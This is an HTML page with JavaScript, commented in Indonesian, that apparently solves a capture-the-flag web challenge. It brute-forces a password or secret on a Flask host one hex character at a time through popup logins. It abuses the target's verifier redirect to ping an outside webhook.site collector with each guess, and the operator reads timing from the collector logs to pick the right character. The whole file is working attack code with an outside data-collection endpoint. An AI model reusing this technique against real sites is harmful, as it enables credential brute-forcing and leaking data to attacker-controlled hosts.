<!doctype html>
<meta charset="utf-8" />
<title>solver</title>
<script>
const HOST = "http://research.r3plican.dev:1336";          // target Flask
const COLLECTOR = "https://webhook.site/094d81b4-c0aa-4fc1-ba3f-369e0a6b53e8";              // log receiver
const USERNAME = "longlonglonguser";                             // asumsi default

const HEX = "0123456789abcdef";
const PREFIX = "replicanx";
const TRIES_PER_CAND = 6;    // 5-8 cukup, makin besar makin stabil

async function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }

async function tryCandidate(prefix){
  // buka popup ke Flask (cross-origin), kita masih bisa set location berkali-kali
  const w = window.open(`${HOST}/api/login?username=${USERNAME}&password=${encodeURIComponent(prefix)}`, "_blank");
  const t0 = performance.now();

  // beri waktu network settle sedikit
  await sleep(300);
  try { w.location = `${HOST}/dashboard/`; } catch(e) {}
  await sleep(150);

  // trigger verifier -> redirect ke collector kita (jadi “ping”)
  const ping = `${COLLECTOR}/ping?g=${encodeURIComponent(prefix)}&t=${Date.now()}`;
  try { w.location = `${HOST}/verifier?q=${encodeURIComponent(ping)}`; } catch(e) {}

  // kita tidak bisa menunggu network dari sini; biarkan bot menutup sendiri.
  // script ini hanya men-*schedule* urutan aksi di tab popup.
}

async function run(){
  // brute force 6 nibble, prefix-by-prefix
  let known = PREFIX;
  for (let i = 0; i < 6; i++){
    // uji semua kandidat nibble di posisi ini
    for (const c of HEX){
      for (let k = 0; k < TRIES_PER_CAND; k++){
        await tryCandidate(known + c);
        await sleep(400); // jeda pendek
      }
    }
    // kamu pilih nibble terbaik (median waktu terendah) dari log collector
    // lalu update "known += bestNibble" dan reload solver.html dengan query ?known=<...>
  }
}

run();
</script>
